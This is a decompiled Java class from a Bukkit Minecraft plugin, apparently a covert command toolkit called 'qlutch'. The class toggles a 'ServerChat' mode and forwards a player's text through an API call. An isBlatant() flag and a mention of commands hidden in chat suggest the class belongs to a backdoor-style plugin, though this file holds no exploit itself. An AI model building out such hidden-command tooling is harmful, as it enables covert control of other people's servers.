/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import org.bukkit.entity.Player;

public class ServerchatCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            if (plugin.serverchat.contains(p2.getName())) {
                plugin.serverchat.remove(p2.getName());
                p2.sendMessage(Settings.PREFIX("ServerChat has been turned " + Settings.RED + "OFF"));
            } else {
                plugin.serverchat.add(p2.getName());
                p2.sendMessage(Settings.PREFIX("ServerChat has been turned " + Settings.RED + "ON"));
                p2.sendMessage(Settings.PREFIX("Everything you send will be sent to ServerChat as long as it isn't a qlutch command"));
            }
        } else {
            StringBuilder chat = new StringBuilder();
            for (int i2 = 1; i2 != args.length; ++i2) {
                chat.append(args[i2]).append(" ");
            }
            API.sendPM(p2, chat.toString());
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

